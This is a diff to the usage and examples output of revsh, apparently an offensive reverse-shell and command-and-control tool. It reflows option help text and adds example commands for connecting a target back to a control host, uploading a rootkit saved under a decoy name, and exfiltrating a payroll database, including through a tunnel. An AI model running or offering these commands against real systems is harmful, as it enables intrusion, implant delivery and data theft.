@@ -87,6 +87,9 @@ void usage(int ret_code){
 
 	fprintf(out_stream, "\nControl:\t%s -c [CONTROL_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS[:PORT]]\n", program_invocation_short_name);
 	fprintf(out_stream, "Target:\t\t%s     [TARGET_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS[:PORT]]\n", program_invocation_short_name);
+	fprintf(out_stream, "\n\tADDRESS\t\tThe address of the control listener.\t\t(Default is \"%s\".)\n", CONTROL_ADDRESS);
+	fprintf(out_stream, "\tPORT\t\tThe port of the control listener.\t\t(Default is \"%s\".)\n", CONTROL_PORT);
+
 	fprintf(out_stream, "\nCONTROL_OPTIONS:\n");
 	fprintf(out_stream, "\t-c\t\tRun in \"command and control\" mode.\t\t(Default is target mode.)\n");
 #ifndef GENERIC_BUILD
@@ -108,15 +111,15 @@ void usage(int ret_code){
 	fprintf(out_stream, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
 
 	fprintf(out_stream, "\nMUTUAL_OPTIONS:\n");
-	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tNode will neither exit normally, nor seppuku from timeout.\n");
+	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tNode will neither exit normally, nor timeout.\n");
 	fprintf(out_stream, "\t-L [LHOST:]LPORT:RHOST:RPORT\n");
-	fprintf(out_stream, "\t\t\tStatic socket forwarding with a local\n\t\t\tlistener at LHOST:LPORT forwarding to RHOST:RPORT.\n"); 
+	fprintf(out_stream, "\t\t\tStatic socket forwarding with a local listener\n\t\t\tat LHOST:LPORT forwarding to RHOST:RPORT.\n"); 
 	fprintf(out_stream, "\t-R [RHOST:]RPORT:LHOST:LPORT\n");
-	fprintf(out_stream, "\t\t\tStatic socket forwarding with a remote\n\t\t\tlistener at RHOST:RPORT forwarding to LHOST:LPORT.\n"); 
+	fprintf(out_stream, "\t\t\tStatic socket forwarding with a remote listener\n\t\t\tat RHOST:RPORT forwarding to LHOST:LPORT.\n"); 
 	fprintf(out_stream, "\t-D [LHOST:]LPORT\n");
-	fprintf(out_stream, "\t\t\tDynamic socket forwarding with a local\n\t\t\tlistener at LHOST:LPORT.\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
+	fprintf(out_stream, "\t\t\tDynamic socket forwarding with a local listener\n\t\t\tat LHOST:LPORT.\t\t\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
 	fprintf(out_stream, "\t-B [RHOST:]RPORT\n");
-	fprintf(out_stream, "\t\t\tDynamic socket forwarding with a remote\n\t\t\tlistener at LHOST:LPORT.\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
+	fprintf(out_stream, "\t\t\tDynamic socket forwarding with a remote listener\n\t\t\tat LHOST:LPORT.\t\t\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
 	fprintf(out_stream, "\t-x\t\tDisable automatic setup of proxies.\t\t(Defaults: Proxy D%s and tun/tap devices.)\n", SOCKS_LISTENER);
 	fprintf(out_stream, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
 	fprintf(out_stream, "\t\t\tThe -b flag must be invoked on both ends.\n");
@@ -125,9 +128,6 @@ void usage(int ret_code){
 	fprintf(out_stream, "\t-h\t\tPrint this help.\n");
 	fprintf(out_stream, "\t-e\t\tPrint out some usage examples.\n");
 
-	fprintf(out_stream, "\n\tADDRESS\t\tThe address of the control listener.\t\t(Default is \"%s\".)\n", CONTROL_ADDRESS);
-	fprintf(out_stream, "\tPORT\t\tThe port of the control listener.\t\t(Default is \"%s\".)\n", CONTROL_PORT);
-
 #ifdef GENERIC_BUILD
 	fprintf(out_stream, "\n\tThis is the GENERIC_BUILD of revsh, which defaults to Anonymous Diffie-Hellman encryption.\n");
 	fprintf(out_stream, "\tIn order to enable Ephemeral Diffie-Hellman (with Perfect Forward Secrecy) you will need to\n");
@@ -135,7 +135,7 @@ void usage(int ret_code){
 	fprintf(out_stream, "\tThe source is available at: https://github.com/emptymonkey/revsh\n");
 #endif
 
-	fprintf(out_stream, "\n\n");
+	fprintf(out_stream, "\n");
 
 	exit(ret_code);
 }
@@ -159,26 +159,33 @@ void examples(int ret_code){
 		out_stream = stderr;
 	}
 
-	fprintf(out_stream, "\n%s usage examples for:\n", program_invocation_short_name);
-	fprintf(out_stream, "\tcontrol host: 192.168.0.42\n");
-	fprintf(out_stream, "\ttarget host:  192.168.0.66\n");
+	fprintf(out_stream, "\n");
+	fprintf(out_stream, "control host in examples: 192.168.0.42\n");
+	fprintf(out_stream, "target host in examples:  192.168.0.66\n");
 
-	fprintf(out_stream, "\nInteractive example:\n");
+	fprintf(out_stream, "\nInteractive example on default port '%s':\n", CONTROL_PORT);
+	fprintf(out_stream, "\tcontrol:\trevsh -c\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42\n");
+
+	fprintf(out_stream, "\nInteractive example on non-standard port '443':\n");
 	fprintf(out_stream, "\tcontrol:\trevsh -c 192.168.0.42:443\n");
 	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443\n");
 
-	fprintf(out_stream, "\nInteractive example with ADDRESS defined as 192.168.0.42:443 in config.h:\n");
-	fprintf(out_stream, "\tcontrol:\trevsh -c\n");
-	fprintf(out_stream, "\ttarget:\t\trevsh\n");
-
 	fprintf(out_stream, "\nBindshell example:\n");
-	fprintf(out_stream, "\ttarget:\t\trevsh -b 192.168.0.66:443\n");
-	fprintf(out_stream, "\tcontrol:\trevsh -c -b 192.168.0.66:443\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh -b\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c -b 192.168.0.66\n");
 
-	fprintf(out_stream, "\nNon-interactive file transfer example:\n");
-	fprintf(out_stream, "\tcontrol:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
-	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
+	fprintf(out_stream, "\nNon-interactive file upload example:\n");
+	fprintf(out_stream, "\tcontrol:\tcat ~/bin/rootkit | revsh -c -n\n");
+	fprintf(out_stream, "\ttarget:\t\trevsh 192.168.0.42 > ./totally_not_a_rootkit\n");
 
+	fprintf(out_stream, "\nNon-interactive file download example:\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c -n >payroll_db.tar\n");
+	fprintf(out_stream, "\ttarget:\t\tcat payroll_db.tar | revsh 192.168.0.42\n");
+
+	fprintf(out_stream, "\nNon-interactive file download example across existing tunnel:\n");
+	fprintf(out_stream, "\tcontrol:\trevsh -c -n 127.0.0.1:2291 >payroll_db.tar\n");
+	fprintf(out_stream, "\ttarget:\t\tcat payroll_db.tar | revsh 127.0.0.1:2290\n");
 	fprintf(out_stream, "\n\n");
 
 	exit(ret_code);
